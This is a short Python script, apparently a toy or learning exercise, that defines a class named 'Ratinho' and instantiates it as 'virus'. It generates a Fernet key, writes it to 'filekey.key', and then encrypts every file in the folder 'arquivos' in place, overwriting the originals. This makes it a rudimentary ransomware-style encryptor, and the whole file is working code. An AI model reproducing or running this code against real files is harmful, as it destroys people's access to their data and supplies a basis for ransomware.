import os, glob
from cryptography.fernet import Fernet


class Ratinho:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.fernet = None


    def generate_key_file(self):
        with open('filekey.key', 'wb') as f:
            f.write(self.key)
            self.fernet = Fernet(self.key)

    
    def set_key_file(self, file_name):
        with open(file_name, 'rb') as f:
            self.key = f.read()
            self.fernet = Fernet(self.key)


    def encrypt(self, file_name):
        with open(file_name, 'rb') as f:
            original = f.read()

        encrypted = self.fernet.encrypt(original)

        with open(file_name, 'wb') as f:
            f.write(encrypted)


    def decrypt(self, file_name):
        with open(file_name, 'rb') as f:
            encrypted = f.read()

        decrypted = self.fernet.decrypt(encrypted)

        with open(file_name, 'wb') as f:
            f.write(decrypted)


virus = Ratinho()
virus.generate_key_file()
virus.encrypt('arquivo.txt')
virus.decrypt('arquivo.txt')

folder_path = 'arquivos'
for file_name in glob.glob(os.path.join(folder_path, '*.*')):
    with open(file_name, 'r') as f:
        virus.encrypt(file_name)

